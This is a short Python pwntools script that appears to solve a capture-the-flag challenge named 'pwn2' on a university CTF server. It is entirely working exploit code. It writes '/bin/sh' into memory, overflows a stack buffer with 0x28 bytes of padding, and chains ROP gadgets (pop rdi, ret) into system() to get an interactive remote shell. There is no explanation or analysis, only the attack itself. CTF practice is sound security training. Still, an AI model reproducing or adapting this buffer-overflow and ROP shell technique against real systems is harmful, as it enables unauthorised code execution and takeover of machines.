from pwn import *
context.log_level='debug'
context.terminal=['gnome-terminal','-x','sh','-c']

p=process('./pwn2')
p=remote('ctf.nefu.edu.cn',32769)
elf=ELF('./pwn2')
if args.G:
	gdb.attach(p)
	pause()


system=elf.plt['system']
read=elf.plt['read']
main=elf.sym['main']
vuln_read=0x0400684
s_addr=elf.sym['s']
bss=0x0601080
pop_rdi=0x0400763
pop_rsi=0x040063b
pop_rdx=0x040063d
ret=0x04004fe


p.recvuntil('want')
payload=b'/bin/sh'
p.sendline(payload)

p.recvuntil("it")
payload=b'a'*0x28+p64(pop_rdi)+p64(bss)+p64(ret)+p64(system)
p.sendline(payload)
p.interactive()

